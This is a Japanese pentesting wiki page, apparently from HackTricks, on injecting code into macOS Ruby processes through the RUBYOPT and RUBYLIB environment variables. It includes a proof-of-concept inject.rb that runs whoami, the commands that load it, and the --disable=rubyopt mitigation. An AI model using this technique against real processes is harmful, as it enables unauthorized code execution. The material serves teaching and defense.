# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby は script を実行する前に、`RUBYOPT` 環境変数からサポート対象のコマンドラインスイッチを解析します。Ruby は `RUBYOPT` 内の `-e` による code execution を拒否しますが、`-I` で library-search directory を先頭に追加し、`-r` で library を require できます。そのため、攻撃者が制御する環境変数を使って Ruby を起動する process は、攻撃者が制御する Ruby code を読み込むように仕向けられます。<sup>[[1]](#references)</sup>

`/tmp/inject.rb` を作成します：
```ruby:inject.rb
puts `whoami`
```
無害な Ruby スクリプト（`hello.rb` など）を作成します。
```ruby:hello.rb
puts 'Hello, World!'
```
制御された `RUBYOPT` 値で実行します：
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
この動作を無効にするには、スクリプト名の**前**に`--disable=rubyopt`（または`--disable-rubyopt`）を指定します:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
`hello.rb` の後に記述されたオプションは、スクリプトに `ARGV` として渡されます。Ruby による `RUBYOPT` の先行処理が無効になるわけではありません。<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## RUBYLIB

`RUBYOPT` 内で `-I` を使って load directory を先頭に追加する代わりに、独立した `RUBYLIB` environment variable は Ruby の `$LOAD_PATH` に directories を追加します。`RUBYOPT=-r<module>` と組み合わせることで、`RUBYOPT` 内で `-I` を使わずに攻撃者コードを読み込めます:<sup>[[1]](#references)</sup>
```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```
## References

- [1] [Ruby documentation - Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
